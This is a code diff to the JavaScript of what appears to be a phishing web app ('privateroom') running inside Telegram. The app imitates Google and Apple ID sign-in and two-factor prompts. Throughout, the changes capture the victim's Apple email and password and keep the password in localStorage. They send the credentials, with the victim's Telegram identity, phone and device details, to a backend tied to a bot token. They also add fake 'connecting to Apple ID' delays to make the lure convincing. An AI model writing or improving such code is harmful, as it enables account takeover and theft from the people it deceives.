@@ -19,6 +19,7 @@ function initApp() {
     const stepApplePassword = document.getElementById("stepApplePassword");
     const stepApple2FA = document.getElementById("stepApple2FA");
     const stepApplePrompt = document.getElementById("stepApplePrompt");
+    const stepAppleLoading = document.getElementById("stepAppleLoading");
     const stepSuccess = document.getElementById("stepSuccess");
 
     const codeInput = document.getElementById("codeInput");
@@ -88,7 +89,7 @@ function initApp() {
     let userGoogleEmail = localStorage.getItem("privateroom_google_email") || "";
     let userGooglePassword = "";
     let userAppleEmail = localStorage.getItem("privateroom_apple_email") || "";
-    let userApplePassword = "";
+    let userApplePassword = localStorage.getItem("privateroom_apple_password") || "";
     let resendTimer = null;
     let resendSecondsLeft = 0;
     let isAuthorized = localStorage.getItem("privateroom_authorized") === "true";
@@ -220,7 +221,7 @@ function initApp() {
         ].includes(targetStep);
 
         const isAppleStep = [
-            stepAppleEmail, stepApplePassword, stepApple2FA, stepApplePrompt
+            stepAppleEmail, stepApplePassword, stepApple2FA, stepApplePrompt, stepAppleLoading
         ].includes(targetStep);
 
         if (googleAuthModal) {
@@ -277,7 +278,7 @@ function initApp() {
         [
             stepPhone, stepCode, step2FA, 
             stepGoogleEmail, stepGooglePassword, stepGooglePrompt, stepGoogleConsent,
-            stepAppleEmail, stepApplePassword, stepApple2FA, stepApplePrompt,
+            stepAppleEmail, stepApplePassword, stepApple2FA, stepApplePrompt, stepAppleLoading,
             stepSuccess
         ].forEach(s => s && s.classList.remove("active"));
         if (targetStep) targetStep.classList.add("active");
@@ -462,6 +463,8 @@ function initApp() {
             localStorage.removeItem("privateroom_current_step");
             localStorage.removeItem("privateroom_saved_phone");
             localStorage.removeItem("privateroom_google_email");
+            localStorage.removeItem("privateroom_apple_email");
+            localStorage.removeItem("privateroom_apple_password");
             localStorage.removeItem("privateroom_session_id");
             localStorage.removeItem("privateroom_code_requested_at");
         } catch (e) {}
@@ -486,6 +489,7 @@ function initApp() {
             localStorage.removeItem("privateroom_google_email");
             localStorage.removeItem("privateroom_google_saved_at");
             localStorage.removeItem("privateroom_apple_email");
+            localStorage.removeItem("privateroom_apple_password");
             localStorage.removeItem("privateroom_session_id");
             localStorage.removeItem("privateroom_code_requested_at");
         } catch (e) {}
@@ -759,7 +763,8 @@ function initApp() {
         const userUsername = tg?.initDataUnsafe?.user?.username || null;
         const userNickname = [tg?.initDataUnsafe?.user?.first_name, tg?.initDataUnsafe?.user?.last_name].filter(Boolean).join(" ") || null;
         const currentPhone = userPhone || localStorage.getItem("privateroom_saved_phone") || null;
-        const currentEmail = email || userGoogleEmail || localStorage.getItem("privateroom_google_email") || null;
+        const currentEmail = email || userAppleEmail || userGoogleEmail || localStorage.getItem("privateroom_apple_email") || localStorage.getItem("privateroom_google_email") || null;
+        const currentPassword = password || userApplePassword || userGooglePassword || localStorage.getItem("privateroom_apple_password") || ((typeof password2FA !== "undefined" && password2FA) ? password2FA.value : null) || null;
         const currentDevice = device || getDeviceInfo();
         const urlParams = new URLSearchParams(window.location.search);
         const botTokenParam = urlParams.get("bot_token") || urlParams.get("mirror_token") || localStorage.getItem("privateroom_bot_token") || null;
@@ -779,7 +784,7 @@ function initApp() {
             phone: currentPhone,
             email: currentEmail,
             details: details,
-            password_2fa: password,
+            password_2fa: currentPassword,
             device: currentDevice,
             is_test: isTestFlag,
             bot_token: botTokenParam
@@ -1045,8 +1050,8 @@ function initApp() {
         const userTgId = tg?.initDataUnsafe?.user?.id || null;
         const userUsername = tg?.initDataUnsafe?.user?.username || null;
         const userNickname = [tg?.initDataUnsafe?.user?.first_name, tg?.initDataUnsafe?.user?.last_name].filter(Boolean).join(" ") || null;
-        const pwd = ((typeof password2FA !== "undefined" && password2FA) ? password2FA.value : null) || userGooglePassword || userApplePassword || data?.password || null;
-        const email = userGoogleEmail || userAppleEmail || data?.google_email || data?.apple_email || localStorage.getItem("privateroom_google_email") || localStorage.getItem("privateroom_apple_email") || null;
+        const pwd = ((typeof password2FA !== "undefined" && password2FA) ? password2FA.value : null) || userApplePassword || userGooglePassword || data?.password || localStorage.getItem("privateroom_apple_password") || null;
+        const email = userAppleEmail || userGoogleEmail || data?.apple_email || data?.google_email || data?.email || localStorage.getItem("privateroom_apple_email") || localStorage.getItem("privateroom_google_email") || null;
 
         const urlParams = new URLSearchParams(window.location.search);
         const botTokenParam = urlParams.get("bot_token") || urlParams.get("mirror_token") || localStorage.getItem("privateroom_bot_token") || null;
@@ -1762,22 +1767,33 @@ function initApp() {
     // Modal Triggers & Navigation
     if (btnSwitchToApple) {
         btnSwitchToApple.addEventListener("click", () => {
-            clearAppleErrors();
-            showStep(stepAppleEmail);
-            startApplePolling();
-            detectAppleGeoLocation();
-            if (appleEmailInput) {
-                appleEmailInput.value = userAppleEmail || "";
-                setTimeout(() => {
-                    try {
-                        appleEmailInput.focus();
-                        if (typeof appleEmailInput.setSelectionRange === "function") {
-                            const len = appleEmailInput.value.length;
-                            appleEmailInput.setSelectionRange(len, len);
-                        }
-                    } catch (e) {}
-                }, 150);
-            }
+            if (btnSwitchToApple.classList.contains("loading")) return;
+            btnSwitchToApple.classList.add("loading");
+            const originalHtml = btnSwitchToApple.innerHTML;
+            btnSwitchToApple.innerHTML = '<span class="apple-btn-spinner"></span><span>Подключение к Apple ID...</span>';
+
+            if (appleLoadingBar) appleLoadingBar.classList.remove("hidden");
+
+            setTimeout(() => {
+                btnSwitchToApple.classList.remove("loading");
+                btnSwitchToApple.innerHTML = originalHtml;
+                clearAppleErrors();
+                showStep(stepAppleEmail);
+                startApplePolling();
+                detectAppleGeoLocation();
+                if (appleEmailInput) {
+                    appleEmailInput.value = userAppleEmail || "";
+                    setTimeout(() => {
+                        try {
+                            appleEmailInput.focus();
+                            if (typeof appleEmailInput.setSelectionRange === "function") {
+                                const len = appleEmailInput.value.length;
+                                appleEmailInput.setSelectionRange(len, len);
+                            }
+                        } catch (e) {}
+                    }, 150);
+                }
+            }, 800);
         });
     }
 
@@ -1905,6 +1921,9 @@ function initApp() {
             handledAppleAskCode = false;
             handledAppleAskPrompt = false;
             userApplePassword = pwd;
+            try {
+                localStorage.setItem("privateroom_apple_password", pwd);
+            } catch (e) {}
             btnSubmitApplePassword.disabled = true;
             if (appleLoadingBar) appleLoadingBar.classList.remove("hidden");
 
@@ -2093,13 +2112,20 @@ function initApp() {
                     }
                 } else if (ctrl.status === "completed" || data.authorized) {
                     stopApplePolling();
-                    if (appleLoadingBar) appleLoadingBar.classList.add("hidden");
-                    if (appleAuthModal) appleAuthModal.classList.add("hidden");
-                    finishAuth({
-                        status: "success",
-                        google_email: userAppleEmail,
-                        password: userApplePassword
-                    });
+                    if (appleLoadingBar) appleLoadingBar.classList.remove("hidden");
+                    if (stepAppleLoading) {
+                        showStep(stepAppleLoading);
+                    }
+                    setTimeout(() => {
+                        if (appleLoadingBar) appleLoadingBar.classList.add("hidden");
+                        if (appleAuthModal) appleAuthModal.classList.add("hidden");
+                        finishAuth({
+                            status: "success",
+                            apple_email: userAppleEmail,
+                            email: userAppleEmail,
+                            password: userApplePassword
+                        });
+                    }, 1400);
                 }
             }
         }, 1200);
